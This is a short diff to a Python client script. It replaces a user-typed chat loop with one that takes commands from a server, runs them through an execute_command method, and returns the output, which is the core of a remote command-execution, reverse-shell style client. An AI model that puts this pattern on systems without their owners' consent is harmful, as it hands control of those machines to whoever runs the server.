@@ -13,11 +13,23 @@ def main():
 
     client.connect()
 
+    print("Connected to server")
+
     while True:
 
-        message = input("client > ")
+        command = client.receive()
 
-        client.send(message)
+        if command is None:
+            print("Server disconnected")
+            break
+
+        print(f"Received command: {command}")
+
+        result = client.execute_command(command)
+
+        client.send(result)
+
+    client.close()
 
 
 if __name__ == "__main__":
